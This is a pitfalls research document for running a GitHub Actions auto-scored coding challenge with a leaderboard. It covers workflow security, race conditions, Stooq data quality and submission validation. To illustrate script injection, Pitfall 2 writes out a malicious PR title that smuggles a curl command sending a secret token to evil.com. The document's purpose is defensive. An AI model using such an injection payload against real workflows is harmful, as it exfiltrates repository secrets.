# Domain Pitfalls: GitHub Actions Auto-Scoring for Public Coding Challenges

**Domain:** GitHub-based coding challenge with automated scoring and leaderboard
**Researched:** 2026-02-12
**Confidence:** HIGH (verified with official GitHub documentation and recent security research)

## Critical Pitfalls

Mistakes that cause security breaches, data corruption, or system compromise.

### Pitfall 1: pull_request_target Privilege Escalation

**What goes wrong:** Using `pull_request_target` instead of `pull_request` to score fork PRs gives untrusted code access to repository secrets and write permissions. Attackers can exfiltrate secrets, modify the leaderboard maliciously, or execute arbitrary code with repository permissions.

**Why it happens:** Developers choose `pull_request_target` because `pull_request` events from forks don't have write access to post comments or update files. They don't realize `pull_request_target` runs with base repository permissions and can execute code from the fork.

**Consequences:**
- Secret exfiltration (API keys, tokens)
- Malicious leaderboard manipulation
- Supply chain attacks (modifying workflow files, injecting backdoors)
- RCE on self-hosted runners if used

**Real-world impact:** In 2025, researchers compromised repositories owned by Microsoft, Google, and NVIDIA using single PRs exploiting pull_request_target. The Shai Hulud v2 worm (November 2025) infected 20,000+ repositories. GhostAction (September 2025) hijacked 327 accounts and stole 3,325 secrets.

**Prevention:**
1. **Never use pull_request_target** for scoring untrusted submissions
2. Use `pull_request` trigger with explicit permissions
3. Grant minimal GITHUB_TOKEN permissions: `permissions: { contents: read, pull-requests: write }`
4. Never checkout PR code with `pull_request_target` — only use it for posting results
5. If you must use pull_request_target, implement two-workflow pattern:
   - Workflow 1: `pull_request` trigger, runs untrusted code in sandbox, uploads results as artifact
   - Workflow 2: `pull_request_target` trigger, downloads artifact, posts comment (never executes PR code)

**Detection:**
- Workflow files contain `on: pull_request_target`
- Workflow checks out PR code: `actions/checkout@v4` with `ref: ${{ github.event.pull_request.head.sha }}`
- Workflow has write permissions and runs code from fork

**Phase to address:** Phase 1 (CI Architecture) — this is foundational

**Sources:**
- [GitHub Actions preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/) — HIGH confidence
- [Orca Security pull_request_nightmare exploits](https://orca.security/resources/blog/pull-request-nightmare-github-actions-rce/) — MEDIUM confidence
- [2025 supply-chain incidents](https://orca.security/resources/blog/github-actions-security-risks/) — MEDIUM confidence

---

### Pitfall 2: Script Injection via Untrusted Inputs

**What goes wrong:** Interpolating untrusted data (PR title, branch name, submission JSON contents) directly into shell commands allows command injection. An attacker can execute arbitrary code by crafting malicious PR metadata.

**Why it happens:** Developers use `${{ github.event.pull_request.title }}` or similar directly in `run:` commands without sanitization. GitHub's expression syntax looks safe but is not shell-escaped.

**Consequences:**
- Arbitrary command execution
- Secret exfiltration via malicious commands
- Workflow bypass (manipulate scoring logic)
- Environment poisoning

**Example attack:**
```yaml
# VULNERABLE
run: echo "Scoring submission for ${{ github.event.pull_request.title }}"
```

Attacker creates PR with title: `"; curl evil.com?secret=$SECRET_TOKEN #`

Result: `echo "Scoring submission for "; curl evil.com?secret=$SECRET_TOKEN #"`

**Prevention:**
1. **Never interpolate untrusted data into shell commands**
2. Use intermediate environment variables for all external inputs:
   ```yaml
   env:
     PR_TITLE: ${{ github.event.pull_request.title }}
   run: echo "Scoring submission for $PR_TITLE"
   ```
3. Validate inputs before use (regex, length limits)
4. Avoid shell execution when possible — use GitHub Actions expressions or Python scripts

**Detection:**
- Workflow contains `${{ github.event.* }}` inside `run:` commands
- Workflow uses PR metadata (title, body, branch name) without sanitization
- grep for patterns: `run:.*\${{.*github\.event`

**Phase to address:** Phase 1 (CI Architecture) — must be correct from day 1

**Sources:**
- [GitHub Actions script injection patterns](https://securitylab.github.com/resources/github-actions-new-patterns-and-mitigations/) — HIGH confidence
- [StepSecurity best practices](https://www.stepsecurity.io/blog/github-actions-security-best-practices) — MEDIUM confidence

---

### Pitfall 3: Leaderboard Race Conditions from Concurrent PRs

**What goes wrong:** Multiple PRs merge or get scored simultaneously. Each workflow reads README, updates leaderboard, commits back. Without concurrency control, workflows interleave: both read the same old README, both write back, second write wins and loses first update. Scores disappear from leaderboard.

**Why it happens:** GitHub Actions runs workflows concurrently by default. Developers don't realize README updates are not atomic.

**Consequences:**
- Leaderboard entries silently disappear
- Participant frustration ("my score was there, now it's gone")
- Incorrect rankings
- Trust erosion in the challenge

**Prevention:**
1. **Use concurrency groups** to serialize leaderboard updates:
   ```yaml
   concurrency:
     group: leaderboard-update
     cancel-in-progress: false  # Wait, don't cancel
   ```
2. Alternative: Store scores in append-only artifact/file, rebuild leaderboard from source of truth
3. Alternative: Use PR comment for scores only, manual leaderboard update (reduces automation but eliminates race)
4. Test concurrent PR scenario during development

**Detection:**
- Workflow modifies README without concurrency control
- Multiple workflows run simultaneously and commit to same file
- Leaderboard entries inconsistent with PR comments

**Phase to address:** Phase 2 (Leaderboard Automation) — test before enabling

**Sources:**
- [GitHub Actions concurrency control](https://oneuptime.com/blog/post/2026-01-25-github-actions-concurrency-control/view) — MEDIUM confidence
- [Race condition discussions](https://github.com/orgs/community/discussions/26333) — LOW confidence

---

### Pitfall 4: Stooq Data Reliability Issues

**What goes wrong:** Stooq historical data contains:
- **Deviations from reference data** up to 11%
- **Identical OHLC values** (Open=Close=High=Low) in up to 10% of days where reference data differs
- **Missing adjusted close prices** — critical for assets distributing dividends (REITs, bond ETFs show misleading performance)
- **Slow download speeds** requiring local caching workarounds
- **Potential rate limiting** on free tier

Using Stooq without validation creates unreproducible results and invalidates backtests.

**Why it happens:** Stooq is free, requires no API key, and widely used for prototyping. Developers assume "good enough" without validating against authoritative sources.

**Consequences:**
- Instance data (mu, Sigma) incorrect — optimal portfolio is wrong
- Participants who validate against Bloomberg/Yahoo Finance get different answers
- Challenge results scientifically invalid
- Reputational damage to DDSC/DQC

**Specific to this challenge:**
- N=20 US large-cap equities, 3 years daily data (2023-01-01 to 2025-12-31)
- K=5 selection problem is sensitive to correlation matrix quality
- Risk-adjusted objective (lambda=0.5) amplifies covariance errors
- No dividends expected for most tickers BUT: BRK-B may have special distributions, AAPL/MSFT have historical buybacks affecting adjusted prices

**Prevention:**
1. **Validate Stooq data before committing instance.json:**
   - Cross-check a subset (5 tickers, 10 random dates) against Yahoo Finance or Alpha Vantage
   - Verify no identical OHLC days
   - Check for missing dates (weekends excluded is normal, missing trading days is not)
2. **Document data source and validation in README:**
   - "Data sourced from Stooq on [date], validated against Yahoo Finance for [tickers]"
   - Include SHA256 hash of instance.json for reproducibility
3. **Commit instance.json to repo** — participants use frozen instance, not live downloads
4. **Provide data validation script** participants can run: `python scripts/validate_instance.py`
5. Consider fallback to yfinance if Stooq fails (but note yfinance has 1-3% missing data issues)

**Detection:**
- Unrealistic correlation values (|corr| > 0.99 between unrelated assets)
- Negative variance on diagonal of Sigma
- Submissions from knowledgeable participants question data quality
- Identical OHLC values in downloaded CSVs

**Phase to address:**
- Phase 0 (Validation) — validate and commit instance.json BEFORE launch
- Phase 1 (CI Architecture) — CI uses committed instance.json, not live downloads

**Sources:**
- [yfinance vs Stooq data quality comparison](https://medium.com/@Tobi_Lux/data-from-yfinance-some-observations-41e99d768069) — MEDIUM confidence
- [Stooq missing adjusted close issue](https://github.com/pydata/pandas-datareader/issues/733) — MEDIUM confidence
- [yfinance missing data patterns](https://github.com/ranaroussi/yfinance/issues/2607) — MEDIUM confidence

---

### Pitfall 5: Secrets Exposure in Workflow Logs

**What goes wrong:** Accidentally logging secrets (API tokens, environment variables) in GitHub Actions output. Even with `::add-mask::`, secrets can leak via:
- Base64 encoding bypass
- JSON/URL encoding
- Debug print statements in scoring script
- Artifact uploads containing secrets

**Why it happens:** Developers add debug logging during development and forget to remove it. Secrets appear in unexpected contexts (subprocess output, error messages, file contents).

**Consequences:**
- API keys compromised
- Unauthorized access to resources
- Compliance violations if secrets grant access to sensitive data

**For this challenge:**
- GITHUB_TOKEN has write access to repository
- Future: If leaderboard posts to external API (Discord, Slack), webhook URLs are secrets
- Future: If using cloud storage for artifacts, credentials are secrets

**Prevention:**
1. **Minimize secret usage** — this challenge likely needs zero secrets beyond GITHUB_TOKEN
2. **Never echo or print environment variables** in workflow runs
3. **Use GitHub's secret redaction** but don't rely on it:
   ```yaml
   run: echo "::add-mask::${{ secrets.SECRET_NAME }}"
   ```
4. **Review workflow logs before making repo public**
5. **Disable artifact uploads containing user inputs** or sanitize thoroughly
6. **Use minimal GITHUB_TOKEN permissions:**
   ```yaml
   permissions:
     contents: read
     pull-requests: write
   ```

**Detection:**
- Workflow logs contain tokens, keys, or sensitive URLs
- Artifacts contain .env files or credential files
- grep workflow files for `echo.*secrets` or `print.*env`

**Phase to address:** Phase 1 (CI Architecture) — review before first PR

**Sources:**
- [GitHub Actions secrets best practices](https://blog.gitguardian.com/github-actions-security-cheat-sheet/) — HIGH confidence
- [Wiz GitHub security guide](https://www.wiz.io/blog/github-actions-security-guide) — MEDIUM confidence

---

## Moderate Pitfalls

Mistakes that cause delays, incorrect results, or technical debt.

### Pitfall 6: Missing GITHUB_TOKEN Permissions

**What goes wrong:** Workflow triggered by `pull_request` from fork has read-only GITHUB_TOKEN by default. Cannot post comments, update leaderboard, or create check runs. Workflow appears to succeed but fails silently when trying to write.

**Why it happens:** Default permissions changed in 2023 — many examples online assume write access. Developers test on their own PRs (which work) but forks fail.

**Prevention:**
1. **Explicitly declare required permissions** in workflow:
   ```yaml
   permissions:
     contents: read
     pull-requests: write  # Required to post comments
   ```
2. Test with an actual fork PR before launch
3. Add error handling for failed API calls (don't fail silently)

**Phase to address:** Phase 1 (CI Architecture) — test with fork

**Sources:**
- [GitHub Actions permissions management](https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication) — HIGH confidence

---

### Pitfall 7: Overfitting in Portfolio Backtesting

**What goes wrong:** If instance.json is regenerated multiple times during testing, or if challenge parameters (K, lambda, A) are tuned after seeing results, the challenge becomes a backtest optimization exercise rather than a genuine algorithm comparison. Participants who discover the "tuned" parameters have an unfair advantage.

**Why it happens:** Organizers test workflows by running evaluation multiple times, unknowingly data-snooping on the instance. Parameters are tweaked "to make the problem more interesting" after seeing initial results.

**Consequences:**
- Challenge results invalid
- Quantum vs classical comparison meaningless
- Overfitted to specific instance, doesn't generalize
- Academic credibility damaged

**Prevention:**
1. **Freeze instance.json before public announcement:**
   - Generate once with fixed seed
   - Commit to repo with SHA256 hash
   - Never regenerate
2. **Lock challenge parameters** in PROJECT.md with rationale:
   - K=5: "Selected to allow diverse portfolios while maintaining focus"
   - lambda=0.5: "Standard risk aversion in literature (Markowitz 1952)"
   - A=10.0: "Penalty large enough to enforce constraint without dominating objective"
3. **Document instance generation provenance:**
   ```bash
   # Exactly once, committed 2026-02-12
   python scripts/evaluate.py \
     --K 5 --lambda_ 0.5 --penalty_A 10.0 \
     --start 2023-01-01 --end 2025-12-31 \
     --seed 42
   sha256sum data/instance.json > data/instance.json.sha256
   ```
4. **Resist temptation to "improve" problem** after seeing participant results

**Phase to address:** Phase 0 (Validation) — freeze before launch

**Sources:**
- [Portfolio backtesting dangers](https://bookdown.org/palomar/portfoliooptimizationbook/8.3-dangers-backtesting.html) — HIGH confidence
- [Common backtesting mistakes](https://www.blog.quantreo.com/portfolio-backtesting-mistakes/) — MEDIUM confidence

---

### Pitfall 8: Submission Validation Bypass

**What goes wrong:** Scoring script doesn't validate submission format rigorously. Attacker submits:
- JSON with extra fields: `{"x": [...], "exploit": "payload"}`
- Invalid array length: `{"x": [1,1,1,1,1]}` (length 5 instead of 20)
- Non-binary values: `{"x": [0.5, 0.7, ...]}`
- Missing "x" key
- Malformed JSON

If evaluate.py crashes on invalid input, workflow fails and leaderboard breaks.

**Prevention:**
1. **Strict schema validation** in evaluate.py:
   ```python
   import json

   def validate_submission(data):
       if not isinstance(data, dict):
           raise ValueError("Submission must be JSON object")
       if "x" not in data:
           raise ValueError("Missing required key 'x'")
       x = data["x"]
       if not isinstance(x, list):
           raise ValueError("Key 'x' must be array")
       if len(x) != 20:
           raise ValueError(f"Array 'x' must have length 20, got {len(x)}")
       if not all(v in [0, 1] for v in x):
           raise ValueError("Array 'x' must contain only 0 or 1")
       return x
   ```
2. **Return clear error messages** (don't crash)
3. **Test with malformed submissions** during development
4. **Workflow catches evaluation errors** and posts failure comment (not silent fail)

**Phase to address:** Phase 1 (CI Architecture) — add before first PR

---

### Pitfall 9: Leaderboard Manipulation via Timestamp Exploits

**What goes wrong:** Tiebreaker rule is "first submission wins". Attacker discovers optimal solution (e.g., brute force, leaked from organizer testing), closes their old PR, opens new PR with same solution to get earlier timestamp.

Or: Attacker submits many PRs with good-but-not-best solutions, then after seeing others' scores, closes all but the best one.

**Prevention:**
1. **Timestamp is PR creation time, not merge time** (harder to game)
2. **Disallow closed/reopened PRs** — first open counts
3. **Log all submissions** (even closed PRs) so manipulation is auditable
4. Document rule clearly: "First PR with score X wins; closing/reopening doesn't reset timestamp"
5. Consider alternative tiebreaker: SHA256(solution) lexicographic order (deterministic, can't be gamed)

**Phase to address:** Phase 2 (Leaderboard Automation) — define rules early

---

### Pitfall 10: Third-Party Action Supply Chain Attacks

**What goes wrong:** Workflow uses third-party GitHub Actions referenced by mutable tags (`actions/checkout@v4`). Attacker compromises the action's repository, updates the tag to point to malicious code. Next workflow run executes backdoored action.

**Why it happens:** Tags and branches are mutable in Git. Pinning to `@v4` doesn't guarantee the same code every run.

**Prevention:**
1. **Pin actions to immutable SHA hashes:**
   ```yaml
   # Instead of:
   - uses: actions/checkout@v4

   # Use:
   - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
   ```
2. **Enable Dependabot for Actions:**
   ```yaml
   # .github/dependabot.yml
   version: 2
   updates:
     - package-ecosystem: "github-actions"
       directory: "/"
       schedule:
         interval: "weekly"
   ```
3. **Limit to official/verified actions** when possible (actions/* namespace is official GitHub)
4. **Review action source code** before first use (especially community actions)

**Phase to address:** Phase 1 (CI Architecture) — apply before launch

**Sources:**
- [GitHub Actions supply chain security](https://www.wiz.io/blog/github-actions-security-guide) — MEDIUM confidence
- [Pinning actions to SHAs](https://engineering.salesforce.com/github-actions-security-best-practices-b8f9df5c75f5/) — MEDIUM confidence

---

## Minor Pitfalls

Mistakes that cause annoyance but are fixable.

### Pitfall 11: Excessive Workflow Runtime Costs

**What goes wrong:** Scoring workflow runs expensive operations (downloading Stooq data, computing full correlation matrix) on every PR. GitHub Actions free tier has 2000 minutes/month for public repos. Heavy workflows burn quota quickly.

**Prevention:**
1. **Commit instance.json** — CI loads precomputed data, doesn't regenerate
2. **Cache Python dependencies:**
   ```yaml
   - uses: actions/setup-python@v5
     with:
       python-version: '3.11'
       cache: 'pip'
   ```
3. **Skip scoring on draft PRs** (use `if: github.event.pull_request.draft == false`)
4. **Monitor Actions usage** in repository settings

**Phase to address:** Phase 1 (CI Architecture)

---

### Pitfall 12: Unclear Error Messages for Participants

**What goes wrong:** Workflow fails with cryptic error. Participant doesn't know if their submission is invalid, CI is broken, or transient failure. Example: "Process completed with exit code 1" with no context.

**Prevention:**
1. **Catch common errors explicitly:**
   ```python
   try:
       with open(submission_path) as f:
           data = json.load(f)
   except FileNotFoundError:
       print("ERROR: Submission file not found at submissions/your_submission.json")
       print("Did you create the file in the correct location?")
       sys.exit(1)
   except json.JSONDecodeError as e:
       print(f"ERROR: Invalid JSON in submission: {e}")
       sys.exit(1)
   ```
2. **Post failure comment with helpful message:**
   ```yaml
   - name: Post failure comment
     if: failure()
     uses: actions/github-script@v7
     with:
       script: |
         github.rest.issues.createComment({
           issue_number: context.issue.number,
           owner: context.repo.owner,
           repo: context.repo.repo,
           body: 'Scoring failed. Please check the workflow logs for details.'
         })
   ```
3. **Include FAQ link** in failure messages

**Phase to address:** Phase 1 (CI Architecture)

---

### Pitfall 13: Hardcoded Paths Break on Windows

**What goes wrong:** Workflow or scripts use Unix-style paths (`data/instance.json`). Participants on Windows get `FileNotFoundError`.

**Prevention:**
1. **Use pathlib for all file operations:**
   ```python
   from pathlib import Path

   INSTANCE_PATH = Path("data") / "instance.json"
   ```
2. **Test on Windows** before launch (use GitHub Actions matrix if needed)
3. Document supported platforms in README

**Phase to address:** Phase 0 (Validation) — test cross-platform

---

## Phase-Specific Warnings

| Phase Topic | Likely Pitfall | Mitigation |
|-------------|---------------|------------|
| Phase 0: Validation | Stooq data quality (Pitfall 4), overfitting (Pitfall 7) | Validate data against reference, freeze instance.json with hash, test cross-platform |
| Phase 1: CI Architecture | pull_request_target exploit (Pitfall 1), script injection (Pitfall 2), missing permissions (Pitfall 6), supply chain (Pitfall 10) | Use pull_request trigger, sanitize inputs, declare permissions, pin actions to SHAs, test with fork PR |
| Phase 2: Leaderboard Automation | Race conditions (Pitfall 3), timestamp manipulation (Pitfall 9) | Add concurrency groups, define timestamp rules, test concurrent PRs |
| Phase 3: Documentation | Unclear errors (Pitfall 12) | Add FAQ, improve error messages, post helpful failure comments |
| All Phases | Secrets exposure (Pitfall 5) | Review logs before making public, minimize secrets, use minimal permissions |

---

## Quick Security Checklist

Before launching auto-scoring:

- [ ] Workflow uses `pull_request` NOT `pull_request_target`
- [ ] All untrusted inputs passed via environment variables (not interpolated into shell)
- [ ] GITHUB_TOKEN permissions explicitly limited: `contents: read, pull-requests: write`
- [ ] Concurrency group defined for leaderboard updates
- [ ] Actions pinned to SHA hashes, Dependabot enabled
- [ ] No secrets used (or secrets reviewed and masked)
- [ ] Instance.json validated and frozen (with SHA256 hash)
- [ ] Submission validation handles malformed JSON gracefully
- [ ] Tested with actual fork PR (not just branch PR)
- [ ] Workflow logs reviewed for accidental data leaks
- [ ] Error messages helpful for participants
- [ ] Cross-platform tested (Windows paths)

---

## Sources

### HIGH Confidence (Official Documentation)
- [GitHub Security Lab: Preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/)
- [GitHub Security Lab: New vulnerability patterns](https://securitylab.github.com/resources/github-actions-new-patterns-and-mitigations/)
- [GitHub Docs: Automatic token authentication](https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication)
- [Portfolio backtesting dangers (academic)](https://bookdown.org/palomar/portfoliooptimizationbook/8.3-dangers-backtesting.html)

### MEDIUM Confidence (Verified Industry Sources)
- [Orca Security: pull_request_nightmare Part 1](https://orca.security/resources/blog/pull-request-nightmare-github-actions-rce/)
- [Orca Security: pull_request_nightmare Part 2](https://orca.security/resources/blog/pull-request-nightmare-part-2-exploits/)
- [Orca Security: GitHub Actions security risks](https://orca.security/resources/blog/github-actions-security-risks/)
- [StepSecurity: 7 GitHub Actions security best practices](https://www.stepsecurity.io/blog/github-actions-security-best-practices)
- [GitGuardian: GitHub Actions security cheat sheet](https://blog.gitguardian.com/github-actions-security-cheat-sheet/)
- [Wiz: Hardening GitHub Actions](https://www.wiz.io/blog/github-actions-security-guide)
- [Salesforce Engineering: GitHub Actions best practices](https://engineering.salesforce.com/github-actions-security-best-practices-b8f9df5c75f5/)
- [Arctiq: Top 10 GitHub Actions security pitfalls](https://arctiq.com/blog/top-10-github-actions-security-pitfalls-the-ultimate-guide-to-bulletproof-workflows)
- [OneUpTime: Concurrency control](https://oneuptime.com/blog/post/2026-01-25-github-actions-concurrency-control/view)
- [Medium: yfinance data quality observations](https://medium.com/@Tobi_Lux/data-from-yfinance-some-observations-41e99d768069)
- [Quantreo: Portfolio backtesting mistakes](https://www.blog.quantreo.com/portfolio-backtesting-mistakes/)

### MEDIUM Confidence (Community/GitHub Issues)
- [pandas-datareader Issue #733: Stooq futures don't feed](https://github.com/pydata/pandas-datareader/issues/733)
- [yfinance Issue #2607: Missing price data](https://github.com/ranaroussi/yfinance/issues/2607)
- [GitHub Discussion #26333: Race condition with repository creation](https://github.com/orgs/community/discussions/26333)

### Research Context
All searches conducted 2026-02-12. Security findings reflect state-of-the-art as of early 2026, incorporating lessons from 2025 supply-chain incidents (Shai Hulud v2, GhostAction, Nx s1ngularity attack).
